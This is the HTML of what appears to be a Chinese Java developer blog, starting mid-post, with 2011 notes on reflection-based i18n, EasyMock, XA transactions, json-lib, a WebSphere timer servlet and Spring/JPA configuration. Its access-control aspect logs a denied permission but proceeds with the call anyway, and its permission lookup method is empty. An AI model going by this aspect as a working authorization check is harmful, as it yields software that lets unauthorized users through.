class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> private static void defaultLanguage(Object i18n, Locale locale,</span><br><span class="line">		boolean AUser, I18nFiled i18nFiled, Field f)</span><br><span class="line">		throws SecurityException, NoSuchFieldException,</span><br><span class="line">		IllegalArgumentException, IllegalAccessException &#123;</span><br><span class="line">	log.info(&quot;default locale&quot;);</span><br><span class="line">	if (AUser) &#123;</span><br><span class="line">		Field enField = i18n.getClass().getDeclaredField(i18nFiled.en());</span><br><span class="line">		enField.setAccessible(true);</span><br><span class="line">		String enValue = enField.get(i18n).toString();</span><br><span class="line">		f.set(i18n, enValue);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		// BUser</span><br><span class="line">		Field tcField = i18n.getClass().getDeclaredField(i18nFiled.tc());</span><br><span class="line">		tcField.setAccessible(true);</span><br><span class="line">		String tcValue = tcField.get(i18n).toString();</span><br><span class="line">		if (StringUtils.isNotEmpty(tcValue)) &#123;</span><br><span class="line">			// show english</span><br><span class="line">			Field enField = i18n.getClass()</span><br><span class="line">					.getDeclaredField(i18nFiled.en());</span><br><span class="line">			enField.setAccessible(true);</span><br><span class="line">			String enValue = enField.get(i18n).toString();</span><br><span class="line">			f.set(i18n, enValue);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static void convertI18n(Object i18n, Locale locale, boolean AUser) &#123;</span><br><span class="line">	log.info(&quot;locale: &quot; + locale);</span><br><span class="line">	Field[] fields = i18n.getClass().getDeclaredFields();</span><br><span class="line">	for (Field f : fields) &#123;</span><br><span class="line">		if (f.isAnnotationPresent(I18nFiled.class)) &#123;</span><br><span class="line">			f.setAccessible(true);</span><br><span class="line">			I18nFiled i18nFiled = f.getAnnotation(I18nFiled.class);</span><br><span class="line">			if (Locale.SIMPLIFIED_CHINESE.equals(locale)) &#123;</span><br><span class="line">				Field scField = i18n.getClass().getDeclaredField(</span><br><span class="line">						i18nFiled.sc());</span><br><span class="line">				scField.setAccessible(true);</span><br><span class="line">				String scValue = scField.get(i18n).toString();</span><br><span class="line">				if (StringUtils.isNotEmpty(scValue)) &#123;</span><br><span class="line">					f.set(i18n, scValue);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					defaultLanguage(i18n, locale, AUser, i18nFiled, f);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; else if (Locale.TRADITIONAL_CHINESE.equals(locale)) &#123;</span><br><span class="line">				Field tcField = i18n.getClass().getDeclaredField(</span><br><span class="line">						i18nFiled.tc());</span><br><span class="line">				tcField.setAccessible(true);</span><br><span class="line">				String tcValue = tcField.get(i18n).toString();</span><br><span class="line">				if (StringUtils.isNotEmpty(tcValue)) &#123;</span><br><span class="line">					f.set(i18n, tcValue);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					defaultLanguage(i18n, locale, AUser, i18nFiled, f);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				defaultLanguage(i18n, locale, AUser, i18nFiled, f);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static &lt;T&gt; T convertI18n(T i18n, PortletRequest request) &#123;</span><br><span class="line">	Locale locale = request.getLocale();</span><br><span class="line">	User user = User.getCurrentUser(request);</span><br><span class="line">	UserInfo info = user.getUserInfo();</span><br><span class="line">	if (info instanceof AUserUserInfo) &#123;</span><br><span class="line">		convertI18n(i18n, locale, true);</span><br><span class="line">	&#125; else if (info instanceof BUserUserInfo) &#123;</span><br><span class="line">		convertI18n(i18n, locale, false);</span><br><span class="line">	&#125; else if (info instanceof UnknownUserInfo) &#123;</span><br><span class="line">		convertI18n(i18n, locale, true);</span><br><span class="line">	&#125;</span><br><span class="line">	return i18n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static &lt;T&gt; T convertI18n(T i18n) &#123;</span><br><span class="line">	PortletRequest request = (PortletRequest) FacesContext</span><br><span class="line">			.getCurrentInstance().getExternalContext().getRequest();</span><br><span class="line">	return convertI18n(i18n, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-EasyMock-+-Spring的Mock" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-07-27T03:35:15.000Z"><a href="/2011/07/27/EasyMock-+-Spring%E7%9A%84Mock/">2011-07-27</a></time>
      
      
  
    <h1 class="title"><a href="/2011/07/27/EasyMock-+-Spring%E7%9A%84Mock/">EasyMock + Spring的Mock</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p> 本来想模拟JSF的 <code>FacesContext.getCurrentInstance().getExternalContext().getRequest()</code>来获得Principal 但发现比较麻烦，所以只实现模拟HttpServletRequest </p>
<p> 使用EasyMock + Spring的MockObject做较为简单 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Principal principal = EasyMock.createMock(Principal.class);</span><br><span class="line">expect(principal.getName()).andReturn(&quot;JUDYEUNG&quot;);</span><br><span class="line">MockHttpServletRequest request = new MockHttpServletRequest();</span><br><span class="line">replay(principal);</span><br><span class="line"></span><br><span class="line">request.setUserPrincipal(principal);</span><br><span class="line"></span><br><span class="line">uploadBean.setRequest(request);</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-使用XA事务" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-07-27T03:27:33.000Z"><a href="/2011/07/27/%E4%BD%BF%E7%94%A8XA%E4%BA%8B%E5%8A%A1/">2011-07-27</a></time>
      
      
  
    <h1 class="title"><a href="/2011/07/27/%E4%BD%BF%E7%94%A8XA%E4%BA%8B%E5%8A%A1/">使用XA事务</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="如果使用WAS配置XA事务，可以参考"><a href="#如果使用WAS配置XA事务，可以参考" class="headerlink" title="如果使用WAS配置XA事务，可以参考"></a>如果使用WAS配置XA事务，可以参考</h2><p><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/cn/websphere/library/techarticles/0407_woolf/0407_woolf.html">http://www.ibm.com/developerworks/cn/websphere/library/techarticles/0407_woolf/0407_woolf.html</a><br><a target="_blank" rel="noopener" href="http://liuqiang5151.iteye.com/blog/584422">http://liuqiang5151.iteye.com/blog/584422</a>  </p>
<h2 id="如果使用Tomcat，可以使用atomickos"><a href="#如果使用Tomcat，可以使用atomickos" class="headerlink" title="如果使用Tomcat，可以使用atomickos"></a>如果使用Tomcat，可以使用atomickos</h2><p><a target="_blank" rel="noopener" href="http://www.atomikos.com/">http://www.atomikos.com/</a>  </p>
<h2 id="在WAS-Oracle环境中使用XA事务"><a href="#在WAS-Oracle环境中使用XA事务" class="headerlink" title="在WAS+Oracle环境中使用XA事务"></a>在WAS+Oracle环境中使用XA事务</h2><ol>
<li>定义XA数据源   </li>
<li>使用XA的JDBC Driver   </li>
<li>使用WebSphereUowTransactionManager，spring定义<br><code>&lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.transaction.jta.WebSphereUowTransactionManager&quot;/&gt;</code><br>或者使用EJB的CMT或者使用JNDI获得transactionManager控制事务 </li>
<li>如果是SQL SERVER 2008，则还需要如下步骤：<br>Control Panel -&gt; Administrative Tools -&gt; Component Services -&gt; Local DT -&gt; right click -&gt; Properties -&gt; Enable XA Transactions<br>之后restart SQLServer, restart WebServer(WAS or JBoss等)</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>JBoss的XA<br><a target="_blank" rel="noopener" href="http://wenku.baidu.com/view/9441cafa770bf78a65295463.html">http://wenku.baidu.com/view/9441cafa770bf78a65295463.html</a>  </p>
<p>SQL Server的XA<br><a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/aa342335.aspx">http://msdn.microsoft.com/en-us/library/aa342335.aspx</a><br><a target="_blank" rel="noopener" href="http://support.riversedgesoftware.com/knowledgebase.php?article=3">http://support.riversedgesoftware.com/knowledgebase.php?article=3</a> </p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-json-lib的toBean问题" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-07-21T06:46:55.000Z"><a href="/2011/07/21/json-lib%E7%9A%84toBean%E9%97%AE%E9%A2%98/">2011-07-21</a></time>
      
      
  
    <h1 class="title"><a href="/2011/07/21/json-lib%E7%9A%84toBean%E9%97%AE%E9%A2%98/">json-lib的toBean问题</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="XXBean有nested字段需要inject数据和有日期型数据"><a href="#XXBean有nested字段需要inject数据和有日期型数据" class="headerlink" title="XXBean有nested字段需要inject数据和有日期型数据"></a>XXBean有nested字段需要inject数据和有日期型数据</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JsonConfig config = new JsonConfig();</span><br><span class="line">config.setPropertySetStrategy(new PropertySetStrategy() &#123;</span><br><span class="line">  @Override</span><br><span class="line">  public void setProperty(Object bean, String key, Object value)</span><br><span class="line">      throws JSONException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      PropertyUtils.setNestedProperty(bean, key, value);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">XXBean xx = new XXBean();</span><br><span class="line">XXBeanPK pk = new XXBeanPK();</span><br><span class="line">xx.setPk(pk);</span><br><span class="line"></span><br><span class="line">// 需要将字段中的日期型数据由java.sql.Date/java.sql.Timestamp改为java.util.Date</span><br><span class="line">JSONUtils.getMorpherRegistry().registerMorpher(</span><br><span class="line">    new DateMorpher(new String[] &#123; &quot;dd/MM/yyyy&quot;, &quot;HH:mm&quot; &#125;));</span><br><span class="line"></span><br><span class="line">xx = (XX) JSONObject.toBean(JSONObject.fromObject(data, config), xx, config);</span><br><span class="line">log.info(&quot;xx &quot;+ ToStringBuilder.reflectionToString(xx, ToStringStyle.MULTI_LINE_STYLE));</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-自定义访问权限控制" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-07-08T02:56:50.000Z"><a href="/2011/07/08/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/">2011-07-08</a></time>
      
      
  
    <h1 class="title"><a href="/2011/07/08/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/">自定义访问权限控制</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="项目需要做一些权限访问控制，觉得比较好的方案是AOP-annotation，因为在Java-EE的权限控制也是使用类似方式实现。"><a href="#项目需要做一些权限访问控制，觉得比较好的方案是AOP-annotation，因为在Java-EE的权限控制也是使用类似方式实现。" class="headerlink" title="项目需要做一些权限访问控制，觉得比较好的方案是AOP+annotation，因为在Java EE的权限控制也是使用类似方式实现。"></a>项目需要做一些权限访问控制，觉得比较好的方案是AOP+annotation，因为在Java EE的权限控制也是使用类似方式实现。</h1><h2 id="AccessRight的注解"><a href="#AccessRight的注解" class="headerlink" title="AccessRight的注解"></a>AccessRight的注解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@Target( &#123; ElementType.METHOD, ElementType.FIELD &#125;)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">public @interface AccessRight &#123;</span><br><span class="line">  String code();</span><br><span class="line"></span><br><span class="line">  boolean access() default false;</span><br><span class="line"></span><br><span class="line">  boolean create() default false;</span><br><span class="line"></span><br><span class="line">  boolean update() default false;</span><br><span class="line"></span><br><span class="line">  boolean delete() default false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="AccessControlAspect切面"><a href="#AccessControlAspect切面" class="headerlink" title="AccessControlAspect切面"></a>AccessControlAspect切面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@Component //如果不加，spring似乎不会识别这是一个切面</span><br><span class="line">@Aspect</span><br><span class="line">public class AccessControlAspect &#123;</span><br><span class="line">  private static final Logger log = Logger</span><br><span class="line">      .getLogger(AccessControlAspect.class);</span><br><span class="line"></span><br><span class="line">  @Pointcut(&quot;execution(* xx.*Bean.*()) &quot;)</span><br><span class="line">  public void accessControl() &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Around(&quot;accessControl()&quot;)</span><br><span class="line">  public Object checkRight(ProceedingJoinPoint jp) throws Throwable &#123;</span><br><span class="line">    String methodName = jp.getSignature().getName();</span><br><span class="line">    log.info(&quot;check right: &quot; + methodName);</span><br><span class="line">    Method method = jp.getTarget().getClass().getDeclaredMethod(methodName);</span><br><span class="line">    if (method.isAnnotationPresent(AccessRight.class)) &#123;</span><br><span class="line">      AccessRight right = method.getAnnotation(AccessRight.class);</span><br><span class="line">      FunctionPermission permission = getRight(right.code());</span><br><span class="line">      if (right.access() &amp;&amp; permission.hasAccessPermission()) &#123;</span><br><span class="line">        log.info(&quot;has right to do&quot;);</span><br><span class="line">        return jp.proceed();</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        log.error(&quot;no right to do&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return jp.proceed();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private FunctionPermission getRight(String code) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="applicationContext-xml加如下内容："><a href="#applicationContext-xml加如下内容：" class="headerlink" title="applicationContext.xml加如下内容："></a>applicationContext.xml加如下内容：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;context:component-scan base-package=&quot;xx&quot; /&gt;</span><br><span class="line">&lt;aop:aspectj-autoproxy proxy-target-class=&quot;false&quot;/&gt; true表示使用cglib代理，否则使用java反射代理</span><br></pre></td></tr></table></figure>

<h2 id="应用在controller中"><a href="#应用在controller中" class="headerlink" title="应用在controller中"></a>应用在controller中</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">@Scope(&quot;request&quot;)</span><br><span class="line">public class xxBean &#123;</span><br><span class="line">  @AccessRight(code = &quot;something&quot;, access = true)</span><br><span class="line">  public String foobar() &#123;</span><br><span class="line">    log.info(&quot;test...&quot;);</span><br><span class="line">    return &quot;test&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Servlet中执行定时任务" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-06-28T09:51:14.000Z"><a href="/2011/06/28/Servlet%E4%B8%AD%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/">2011-06-28</a></time>
      
      
  
    <h1 class="title"><a href="/2011/06/28/Servlet%E4%B8%AD%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/">Servlet中执行定时任务</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="由于用spring配置的quartz在启动后不能获得UOWManager，考虑多时，只好在servlet启动时候执行定时任务。"><a href="#由于用spring配置的quartz在启动后不能获得UOWManager，考虑多时，只好在servlet启动时候执行定时任务。" class="headerlink" title="由于用spring配置的quartz在启动后不能获得UOWManager，考虑多时，只好在servlet启动时候执行定时任务。"></a>由于用spring配置的quartz在启动后不能获得UOWManager，考虑多时，只好在servlet启动时候执行定时任务。</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Timer;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.persistence.EntityManager;</span><br><span class="line">import javax.persistence.Persistence;</span><br><span class="line">import javax.servlet.GenericServlet;</span><br><span class="line">import javax.servlet.ServletConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line"></span><br><span class="line">import org.apache.log4j.Logger;</span><br><span class="line">import org.springframework.web.context.support.WebApplicationContextUtils;</span><br><span class="line"></span><br><span class="line">import com.ibm.websphere.uow.UOWSynchronizationRegistry;</span><br><span class="line">import com.ibm.ws.uow.UOWManager;</span><br><span class="line">import com.ibm.wsspi.uow.UOWAction;</span><br><span class="line">import com.ibm.wsspi.uow.UOWActionException;</span><br><span class="line">import com.ibm.wsspi.uow.UOWException;</span><br><span class="line"></span><br><span class="line">public class CronJobServlet extends GenericServlet &#123;</span><br><span class="line">  private static final Logger log = Logger.getLogger(CronJobServlet.class);</span><br><span class="line">  private static UOWManager manager;</span><br><span class="line">  private static EntityManager em;</span><br><span class="line">  private XXJob clearXXJob;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public void init(ServletConfig config) throws ServletException &#123;</span><br><span class="line">    initJob(config);</span><br><span class="line">    try &#123;</span><br><span class="line">      InitialContext ic = new InitialContext();</span><br><span class="line">      manager = (UOWManager) ic.lookup(&quot;java:comp/websphere/UOWManager&quot;);</span><br><span class="line">    &#125; catch (NamingException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">      manager.runUnderUOW(</span><br><span class="line">          UOWSynchronizationRegistry.UOW_TYPE_GLOBAL_TRANSACTION,</span><br><span class="line">          false, new UOWAction() &#123;</span><br><span class="line">            public void run() throws Exception &#123;</span><br><span class="line">              Timer timer = new Timer();</span><br><span class="line">              timer.schedule(clearXXJob, 2000,1000);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          &#125;);</span><br><span class="line">    &#125; catch (UOWActionException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; catch (UOWException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void initJob(ServletConfig config) &#123;</span><br><span class="line">    em = Persistence.createEntityManagerFactory(&quot;xx&quot;)</span><br><span class="line">        .createEntityManager();</span><br><span class="line"></span><br><span class="line">    final CronJobService cronJobService = (CronJobService) WebApplicationContextUtils</span><br><span class="line">        .getWebApplicationContext(config.getServletContext()).getBean(</span><br><span class="line">            &quot;cronJobService&quot;);</span><br><span class="line">    cronJobService.setEntityManager(em);</span><br><span class="line">    clearXXJob = new ClearXXJob(cronJobService);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public void service(ServletRequest arg0, ServletResponse arg1)</span><br><span class="line">      throws ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-spring-2.5-+-jpa-1.0- hibernate-3.2)-+-jsf-1.2-..." class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-05-19T09:49:57.000Z"><a href="/2011/05/19/spring-2.5-+-jpa-1.0-%20hibernate-3.2)-+-jsf-1.2-.../">2011-05-19</a></time>
      
      
  
    <h1 class="title"><a href="/2011/05/19/spring-2.5-+-jpa-1.0-%20hibernate-3.2)-+-jsf-1.2-.../">spring 2.5 + jpa 1.0 (hibernate 3.2) + jsf 1.2 ...</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">    xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">    xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">    xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line">    xsi:schemaLocation=&quot;</span><br><span class="line">    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.5.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- bean class=&quot;org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor&quot; / --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;context:component-scan base-package=&quot;xx.yy.locker&quot; /&gt;</span><br><span class="line">    &lt;context:annotation-config /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=&quot;entityManagerFactory&quot;</span><br><span class="line">        class=&quot;org.springframework.orm.jpa.LocalEntityManagerFactoryBean&quot;&gt;</span><br><span class="line">            &lt;property name=&quot;persistenceUnitName&quot; value=&quot;locker&quot; /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=&quot;transactionManager&quot;</span><br><span class="line">        class=&quot;org.springframework.transaction.jta.WebSphereUowTransactionManager&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt;</span><br><span class="line">        &lt;tx:attributes&gt;</span><br><span class="line">            &lt;tx:method name=&quot;get*&quot; read-only=&quot;true&quot;/&gt;</span><br><span class="line">            &lt;tx:method name=&quot;*&quot; read-only=&quot;false&quot; /&gt;</span><br><span class="line">        &lt;/tx:attributes&gt;</span><br><span class="line">    &lt;/tx:advice&gt;</span><br><span class="line"></span><br><span class="line">    &lt;aop:config&gt;</span><br><span class="line">        &lt;aop:pointcut id=&quot;lockerManagerOperation&quot; expression=&quot;execution(public * xx.yy..*.*(..))&quot;/&gt;</span><br><span class="line">        &lt;aop:advisor advice-ref=&quot;txAdvice&quot; pointcut-ref=&quot;lockerManagerOperation&quot;/&gt;</span><br><span class="line">    &lt;/aop:config&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

